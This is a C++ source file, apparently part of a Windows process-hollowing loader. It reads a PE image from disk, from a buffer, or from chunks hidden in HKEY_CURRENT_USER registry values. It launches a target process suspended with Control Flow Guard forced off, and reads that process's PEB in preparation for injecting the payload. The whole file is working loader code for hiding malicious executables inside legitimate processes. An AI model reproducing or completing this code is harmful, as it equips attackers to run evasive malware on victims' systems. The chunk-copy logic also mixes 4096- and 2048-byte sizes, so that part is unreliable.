#include <string>
#include <memory>
#include <vector>
#include <array>

#include "ntapi.h"
#include "globals.h"
#include "PE.h"
#include "GetInfo.h"
#include "WinReg.h"

// Update READ_WRITE_SIZE to match the size from ReadRegKeyValue
#define READ_WRITE_SIZE 2048
#define REG_READ_WRITE_SIZE 4096
// Get the architecture of the PE file
std::string getArch(const NewPEInfo& peInfo)
{
    // Check for the presence of both 32 and 64 bit headers
    if (peInfo.pNtHeaders64) {
        switch (peInfo.pNtHeaders64->FileHeader.Machine) {
        case IMAGE_FILE_MACHINE_AMD64:
            return "x64 (64-bit)";
        case IMAGE_FILE_MACHINE_I386:
            return "x86 (32-bit)";
        default:
            return "Unknown";
        }
    }
    else if (peInfo.pNtHeaders32) {
        switch (peInfo.pNtHeaders32->FileHeader.Machine) {
        case IMAGE_FILE_MACHINE_I386:
            return "x86 (32-bit)";
        case IMAGE_FILE_MACHINE_AMD64:
            return "x64 (64-bit)";
        default:
            return "Unknown";
        }
    }
    return "Invalid";
}

//Get Image size of PE file
SIZE_T GetImageSize(const NewPEInfo& peInfo)
{
    if (is64Bit)
    {
        if (!peInfo.pNtHeaders64) return 0;
        // Return the SizeOfImage from the OptionalHeader
        return peInfo.pNtHeaders64->OptionalHeader.SizeOfImage;
    }
    else
    {
        if (!peInfo.pNtHeaders32) return 0;
        // Return the SizeOfImage from the OptionalHeader
        return peInfo.pNtHeaders32->OptionalHeader.SizeOfImage;
    }

}

// Translate section characteristics to section protections for POverwriting
DWORD get_sec_protection(DWORD sectionCharacteristics)
{
    if ((sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
        && (sectionCharacteristics & IMAGE_SCN_MEM_READ)
        && (sectionCharacteristics & IMAGE_SCN_MEM_WRITE))
    {
        return PAGE_EXECUTE_READWRITE;
    }
    if ((sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
        && (sectionCharacteristics & IMAGE_SCN_MEM_READ))
    {
        return PAGE_EXECUTE_READ;
    }
    if (sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
    {
        return PAGE_EXECUTE_READ;
    }

    if ((sectionCharacteristics & IMAGE_SCN_MEM_READ)
        && (sectionCharacteristics & IMAGE_SCN_MEM_WRITE))
    {
        return PAGE_READWRITE;
    }
    if (sectionCharacteristics & IMAGE_SCN_MEM_READ) {
        return PAGE_READONLY;
    }

    return PAGE_READWRITE;
}

NewPEInfo StorePEInMemory(
    PEInputMode mode,
    LPCSTR strPEPath,
    LPCSTR regKeyPath,
    LPCSTR regValuePrefix,
    const BYTE* pBuffer,
    SIZE_T bufferSize)
{
    NewPEInfo NewPEInfo = { 0 };
    DWORD bytesRead = 0;
    ULONGLONG fileSize = 0;

    // ---------------------- MODE: FILE ----------------------
    if (mode == PEInputMode::FromFile && strPEPath != nullptr)
    {
        HANDLE hFile = CreateFileA(strPEPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            printf("%s doesn't exist, failed to open file", strPEPath);
            return NewPEInfo;
        }

        fileSize = GetFileSize(hFile, NULL);
        if (fileSize == INVALID_FILE_SIZE)
        {
            printf("Failed to get file size. Error: %lu\n", GetLastError());
            CloseHandle(hFile);
            return NewPEInfo;
        }

        NewPEInfo.pFileData = std::unique_ptr<BYTE[]>(new BYTE[fileSize]);
        memset(NewPEInfo.pFileData.get(), 0, fileSize);

        if (!ReadFile(hFile, NewPEInfo.pFileData.get(), fileSize, &bytesRead, NULL) || bytesRead != fileSize)
        {
            printf("Failed to read file. Error: %lu\n", GetLastError());
            CloseHandle(hFile);
            return NewPEInfo;
        }

        CloseHandle(hFile);
    }

    // ---------------------- MODE: REGISTRY ----------------------
    else if (mode == PEInputMode::FromRegistry && regKeyPath && regValuePrefix)
    {
        HKEY hKey = NULL;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, regKeyPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        {
            printf("Failed to open registry key: %s\n", regKeyPath);
            return NewPEInfo;
        }

        std::vector<std::array<BYTE, REG_READ_WRITE_SIZE>> splitFile;
        size_t ulValueSuffix = 1;
        bool bErrorOccurred = false;
        bool bReadStatus = false;

        // Read first part
        std::string strFullName = regValuePrefix + std::to_string(ulValueSuffix);
        std::array<BYTE, REG_READ_WRITE_SIZE> partFile = ReadRegKeyValue(regKeyPath, strFullName.c_str(), bErrorOccurred, bReadStatus);

        // ITERATE THROUGH ALL VALUES WITH THE NAME ['Part#'] OF THE REGISTRY KEY
        while (!bErrorOccurred)
        {
            // APPEND ARRAY INTO VECTOR
            splitFile.push_back(partFile);

            ++ulValueSuffix;
            strFullName = regValuePrefix + std::to_string(ulValueSuffix);

            // STORE VALUE INTO ARRAY
            partFile = ReadRegKeyValue(regKeyPath, strFullName.c_str(), bErrorOccurred, bReadStatus);
        }

        if (splitFile.empty())
        {
            printf("No valid registry parts found\n");
            RegCloseKey(hKey);
            return NewPEInfo;
        }

        // INITIALIZE UNIQUE POINTER TO START OF EACH ARRAY IN THE VECTOR
        NewPEInfo.pFileData = std::unique_ptr<BYTE[]>(new BYTE[splitFile.size() * READ_WRITE_SIZE]);
        memset(NewPEInfo.pFileData.get(), 0, splitFile.size() * READ_WRITE_SIZE);

        // ITERATE THROUGH ALL ARRAYS IN THE VECTOR
        size_t ulArrayIndex = 0;
        for (const auto& split : splitFile)
        {
            // MEMCPY ARRAY TO THE SOURCE PROCESS INFO CLASS FILEDATA BUFFER
            memcpy(&NewPEInfo.pFileData.get()[ulArrayIndex * READ_WRITE_SIZE], 
                   split.data(),
                   READ_WRITE_SIZE);
            ++ulArrayIndex;
        }

        RegCloseKey(hKey);
    }

    // ---------------------- MODE: BUFFER ----------------------
    else if (mode == PEInputMode::FromBuffer && pBuffer && bufferSize > 0)
    {
        NewPEInfo.pFileData = std::unique_ptr<BYTE[]>(new BYTE[bufferSize]);
        memcpy(NewPEInfo.pFileData.get(), pBuffer, bufferSize);
        fileSize = bufferSize;
    }

    else
    {
        printf("Invalid input parameters for StorePEInMemory.\n");
        return NewPEInfo;
    }

    // ---------------------- PE Parsing ----------------------
    NewPEInfo.pDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(NewPEInfo.pFileData.get());

#if defined(_WIN64)
    NewPEInfo.pNtHeaders64 = reinterpret_cast<IMAGE_NT_HEADERS64*>(NewPEInfo.pFileData.get() + NewPEInfo.pDosHeader->e_lfanew);
    NewPEInfo.pRelocationTable = &NewPEInfo.pNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
#else
    NewPEInfo.pNtHeaders32 = reinterpret_cast<IMAGE_NT_HEADERS32*>(NewPEInfo.pFileData.get() + NewPEInfo.pDosHeader->e_lfanew);
    NewPEInfo.pRelocationTable = &NewPEInfo.pNtHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
#endif

    return NewPEInfo;
}

// Create process in suspended state with CFG disabled, returns Process info
PROCESS_INFORMATION GetDestProcessInfo(LPCSTR strDestPath)
{
    PROCESS_INFORMATION destProcessInfo = { 0 };
    STARTUPINFOEX startupInfo = { 0 };
    SIZE_T attrSize = 0;

    // Initialize STARTUPINFOEX
    startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);

    // First call to get required buffer size
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    // Allocate attribute list
    startupInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!startupInfo.lpAttributeList)
    {
        fprintf(stderr, "HeapAlloc failed: %X\n", GetLastError());
        exit(-1);
    }

    // Initialize the attribute list
    if (!InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, &attrSize))
    {
        fprintf(stderr, "InitializeProcThreadAttributeList failed: %X\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
        exit(-1);
    }

    // Disable CFG
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF;
    if (!UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL))
    {
        fprintf(stderr, "UpdateProcThreadAttribute failed: %X\n", GetLastError());
        DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
        exit(-1);
    }

    // Create suspended process with mitigation policy
    BOOL bRet = CreateProcessA(
        (LPSTR)strDestPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        (LPSTARTUPINFOA)&startupInfo,
        &destProcessInfo);

    if (!bRet)
    {
        fprintf(stderr, "CreateProcessA failed: %X\n", GetLastError());
        DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
        exit(-1);
    }

    // Cleanup attribute list after process creation
    DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

    return destProcessInfo;
}

// Get the PEB of a process -> Dest process
PEB GetPEBExternal(HANDLE hProc)
{
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb = { 0 };

    // DECLARE FUNCTION, UNDOCUMENTED WINDOWS LIBRARY
    tNtQueryInformationProcess NtQueryInformationProcess =
        (tNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");

    // QUERY DUMMY PROCESS INFORMATION
    NTSTATUS status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), 0);

    if (NT_SUCCESS(status))
    {
        // GET PEB OF DUMMY PROCESS
        ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(peb), 0);
    }

    return peb;
}


